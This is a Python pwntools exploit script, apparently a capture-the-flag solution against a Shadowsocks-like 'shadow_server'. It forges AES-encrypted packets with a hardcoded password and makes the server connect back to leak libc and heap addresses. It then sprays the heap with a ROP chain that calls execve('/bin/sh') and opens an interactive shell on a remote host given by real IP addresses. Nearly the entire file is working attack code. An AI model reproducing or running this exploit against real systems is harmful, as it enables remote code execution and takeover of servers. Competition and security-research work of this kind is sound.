#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

# lambs:
import hashlib
import socket
from Crypto.Cipher import AES
import sys
import os
import time
from pwn import *
import fcntl,array

def wait(x): return raw_input(x)

# imports


elf = ""
libc = ""
env = ""
LOCAL = 1
context.arch = 'amd64'
#context.log_level = "debug"

if LOCAL:
    def get_main_sock():
        #return process('./shadow_server')
        return remote("127.0.0.1", 8889)
    nethost = '127.0.0.1'
    rem_host = '127.0.0.1'
    port = 3397+int(time.time()) % 100
else:
    def get_main_sock():
        return remote('54.153.22.136', 3343)
    nethost = '138.128.204.246'
    rem_host = '54.153.22.136'
    #rem_host = '39.96.22.2'
    port = 3397+int(time.time()) % 100

password = "meiyoumima"  # password


random.seed(42)
T = int(time.time())


class Counter(object):
    def __init__(self):
        self.cnt = 0

    def get(self):
        self.cnt += 1
        return self.cnt*100


counter = Counter()


assert os.uname()[0] == 'Linux'
SIOCOUTQ = 0x5411
SIOCINQ  = 0x541B
def ioctl_intret(sock, opt):
    buf = array.array('i', [-1])
    fcntl.ioctl(sock.fileno(), opt, buf, True)
    return buf[0]
def unsent_num(sock):
    return ioctl_intret(sock, SIOCOUTQ)

MTU=0x400

def wait_for_all_sent(sock):
    base=0.001
    i=0
    while unsent_num(sock):
        i+=1
        sleep(base)
        base*=2
        if base>=0.5:
            print 'wait for stable mtu',base
            base=0.5
        if i>20 and i%5==0:
            raw_input('make sure that peer is alive!')
    return base

def stable_send(p,s):
    for i in range((len(s)-1)//MTU+1):
        if wait_for_all_sent(p.sock):#>0.1:
            print 'i',i
        p.send(s[i*MTU:(i+1)*MTU])

def make_preexp_packet(timestamp, noise):
    token = hashlib.sha256(password+p64(timestamp)+p64(noise)).digest()[:16]
    md = hashlib.sha256(password+token).digest()
    enc = AES.new(md[:16], AES.MODE_CBC, md[16:])
    orig = token
    orig += p64(timestamp)
    orig += p64(noise)
    orig += chr(1)  # version
    # length, include header(80)+s(len(s)+padding)+randsize(len(random_s))
    orig += p32(79)
    orig += chr(0)  # random len
    orig += "a" * 10  # padding
    orig += "\x00" * 32  # hash sum
    assert len(orig) == 80
    return token+enc.encrypt(orig[16:])


def make_packet(timestamp, noise, packet_len, s, random_s='abcdefgh12345678'):
    token = hashlib.sha256(password+p64(timestamp)+p64(noise)).digest()[:16]
    md = hashlib.sha256(password+token).digest()
    enc = AES.new(md[:16], AES.MODE_CBC, md[16:])
    orig = token
    orig += p64(timestamp)
    orig += p64(noise)
    orig += chr(1)  # version
    # length, include header(80)+s(len(s)+padding)+randsize(len(random_s))
    orig += p32(packet_len)
    orig += chr(len(random_s))  # random len
    orig += "a" * 10  # padding
    orig += "\x00" * 32  # hash sum
    assert len(orig) == 80
    orig += s
    orig += random_s
    hash_sum = hashlib.sha256(orig).digest()
    return token+enc.encrypt(orig[16:48]+hash_sum+orig[80:80+len(s)])+random_s


def make_sc(ip, port, magic_str, length, lastchr=0x80):
    orig = '\x01' * 3
    ippl = ''.join(chr(int(i)) for i in ip.split('.'))
    assert len(ippl) == 4
    orig += ippl+p16(port)[::-1]
    orig += magic_str
    assert len(orig) < length
    # orig+=cyclic(length-len(orig)-1)
    return orig.ljust(length, chr(lastchr))


def recvall(sock):
    s = ''
    while True:
        pk = sock.recv(4096)
        if not pk:
            sock.close()
            return s
        s += pk


def recvn(sock, n):
    s = ''
    while len(s) < n:
        pk = sock.recv(min(n-len(s), 4096))
        if not pk:
            sock.close()
            return s
        s += pk
    return s


def packet_n(n, nport=None):
    if nport is None:
        nport = port
    s = make_sc(nethost, nport, '|say2!|', n)
    pkt = make_packet(T, counter.get(), 80+len(s)+16, s, 'haha'*4)
    return pkt


def malloc(n):
    print 'Malloc', hex(n)
    soc = socket.socket()
    soc.bind(('0.0.0.0', port))
    soc.listen(1)
    p = ssserver()
    pkt = packet_n(n)
    p.send(pkt)
    s2 = soc.accept()
    print 'accept peer', s2[1]
    p.close()
    return recvall(s2[0])


def nofeedback_malloc(n, port):
    print 'Malloc', hex(n)
    p = ssserver()
    pkt = packet_n(n, port)
    stable_send(p, pkt)
    print 'malloc sleep'
    time.sleep(1)
    # p.close()
    return p


def leakone(sz=0x220):
    # end the leak in one run
    soc = socket.socket()
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    soc.bind(('0.0.0.0', port))
    soc.listen(1)
    # exploit
    p = ssserver()
    stable_send(p, packet_n(sz))
    # collect
    s2 = soc.accept()
    print 'accept peer', s2[1]
    # p.close()
    #data = recvall(s2[0])[-0x80:]
    s2 = s2[0]
    recvn(s2, sz-9)
    data = recvn(s2, 0x80)
    v = [u64(data[i*8:(i+1)*8]) for i in range(16)]
    for h,i in enumerate(v):
        print h,hex(i)

    return v[0], v[4], p, s2


def ssserver():
    return remote(rem_host, rem_port)


def heap_writer_exploit():
    return make_preexp_packet(T, counter.get())


def heap_writer():
    p = ssserver()
    stable_send(p, heap_writer_exploit())
    print 'generated heap writer and wait for its balance'
    # time.sleep(1)
    return p


main_sock = get_main_sock()
#main_sock = remote('54.153.22.136', 3343)
main_sock.recvuntil('server bind at ')


rem_port = int(main_sock.recvuntil('\n'))  # int(sys.argv[1])

print 'server', rem_host, rem_port
# time.sleep(1)

#raw_input('no thread ->')
#raw_input('hwp get ready ->')
libc_addr, heap_addr, p, soc = leakone(0x220)
libc_base = libc_addr - 0x3e7d60
print 'libc base:', hex(libc_base)
print 'heap addr:', hex(heap_addr)
raw_input("Go")
malloc_hook = libc_base + 0x3ebc30
free_hook = libc_base + 0x3ed8e8
one = libc_base + 0x4f322
system = libc_base + 0x4f440
binsh = libc_base + 0x1b3e9a
pop_rdi = libc_base + 0x2155f
ret = libc_base + 0x8aa
bins = libc_base+0x3ebcb0
# 0x0000000000114f72 : xor esi, esi ; syscall
# 0x000000000010f613 : xor edx, edx ; xor esi, esi ; mov rdi, rbx ; call rax
# 0x0000000000021351 : pop rax ; pop rbx ; pop rbp ; ret
pop_abp = libc_base+0x21351
setup_call_rax = libc_base+0x10f613
execve = libc_base+0xe4e30
rop = [pop_abp, execve, binsh, 0xdeadbeefdeadceef, setup_call_rax]
nofeedback_malloc(0x800, port+2).close() # big
nofeedback_malloc(0x800, port+2).close() # big
nofeedback_malloc(0x800, port+2).close() # big
nofeedback_malloc(0x800, port+2).close() # big

# l = [nofeedback_malloc(i, port+i//0x1000)
#     for i in range(0x1000, 0x10000, 0x2000)]
# for i in l:
#    i.close()
#hwpl = [heap_writer() for i in range(16)]
#hwpl=[ssserver() for i in range(16)]
signature = 'thiner{:04d}thiner'
dim1 = 8
dim2 = 1
dim3 = 1
hwpl = [None]*dim1*dim2*dim3
'''
for i in range(0, dim1*dim2*dim3, dim1*dim2):
    for j in range(i, i+dim1*dim2, dim1):
        for k in range(j, j+dim1, 1):
            hwpl[k] = ssserver()
        for k in range(j, j+dim1, 1)[::-1]:
            hwpl[k].send(heap_writer_exploit())
    for j in range(i, i+dim1*dim2, dim1):
        for k in range(j, j+dim1, 1):
            hwpl[k].send(signature.format(k))
'''
'''
print 'n', dim1*dim2*dim3
print 'pid', main_sock.pid
for i in range(len(hwpl)):
    hwpl[i]=ssserver()
raw_input('before heap writer')
for i in range(len(hwpl))[::-1]:
    hwpl[i].send(heap_writer_exploit())
for i in range(len(hwpl))[::-1]:
    hwpl[i].send(signature.format(i))
'''
'''
hwpl[0]=ssserver()
raw_input('before heap writer')
hwpl[0].send(heap_writer_exploit())
'''

hwpl1 = [None for i in range(1)]
for h in range(len(hwpl1)):
    hwpl1[h] = ssserver()
    stable_send(hwpl1[h],heap_writer_exploit())
try:
    nofeedback_malloc(0x2000, port+2).close() # big
except:
    print 'spray unavailable from the start'
    main_sock.interactive()
#for h, i in enumerate(hwpl1):
#    i.send(signature.format(h))

spray_material = ret  # 0xfffffffffffffff

#normalpl = [ssserver() for i in range(32)]
# for i in normalpl:
#    i.send(packet_n(0x210000))
#for i in normalpl:
#    i.send(packet_n(0x410)[:-16])

#print 'pid', main_sock.pid
print 'padd', hex(spray_material)
raw_input('before overwriting stack')

# hwpl1[2].send((p64(heap_addr+0x1a10000)+p64(0x21))*(0x500000//8)+p64(spray_material)
#              * 0x50000+p64(pop_rdi)+p64(binsh)+p64(system))

#s = ((p64(heap_addr+0x5000)+p64(0x21))*(0x1f0000//16-4)
#              + (p64(spray_material)
#                 * (0x100//8-5)+''.join(map(p64, rop)))*0x200) #big 

s = ((p64(heap_addr+0x5000)+p64(heap_addr+0x300000))*(0x1f0000//16-4)
              + (p64(spray_material)
                 * (0x100//8-5)+''.join(map(p64, rop)))*0x200) #big 
try:
    stable_send(hwpl1[0],s)
except (EOFError, KeyboardInterrupt):
    print "dead... the exploit did not reach rop?"

'''
spray_head_material = bins
spray_head_material = 0
# spray_material=one
hwpl[-2].send(p64(spray_head_material)*(0x500000//8)+p64(spray_material)
              * 0x50000+p64(pop_rdi)+p64(binsh)+p64(system))
'''
'''
main_arena = None
heap = None
for j in [0x1000, 0x220, 0x220]:
    data = malloc(j)[-0x80:]
    v = [u64(data[i*8:(i+1)*8]) for i in range(16)]
    print 'malloc', hex(j), ':'
    print hexdump(data)
    for i in range(4):
        print(('{:#20x}'*4).format(*v[i*4:(i+1)*4]))
    for h, i in enumerate(v):
        if not main_arena and 0x6f0000000000 < i < 0x800000000000 and (i & 0xfff) == 0xd60:#0xca0:
            main_arena = i
            print 'found main_arena at', h, ':', hex(i)
        elif not heap and 0x550000000000 < i < 0x660000000000:
            heap = i
            print 'found heap at', h, ':', hex(i)
assert main_arena, 'main_arena not found'
assert heap, 'heap not found'
libc_addr = main_arena - 0x3e7d60#0x3ebca0
print 'main arena:', hex(main_arena)
print 'libc:', hex(libc_addr)

heap_addr = heap - 0x18d88
print 'heap leaked:', hex(heap)
print 'heap:', hex(heap_addr)

malloc_hook = libc_addr + 0x3ebc30
free_hook = libc_addr + 0x3ed8e8
one = libc_addr + 0x4f322

conn_v = [ssserver() for i in range(8)]

raw_input('continue with nonexploited ->')

conn_v[0].send(heap_writer_exploit())
'''
'''
hwp = heap_writer()
hwp1 = heap_writer()
hwp2 = heap_writer()
hwp3 = heap_writer()
hwp4 = heap_writer()

p1 = ssserver()
p2 = ssserver()

raw_input('continue ->')
hwp.send(p64(free_hook - 0x8)*4 + p64(heap_addr + 0xc1d320) +
         p64(one) * 2 + p64(one) * (0x100 - 7))
hwp1.send(p64(free_hook - 0x8)*4 + p64(heap_addr + 0xc1d320) +
          p64(one) * 2 + p64(one) * (0x100 - 7))
raw_input('continue ->')

p1.send(packet_n(1024))

'''

main_sock.interactive()
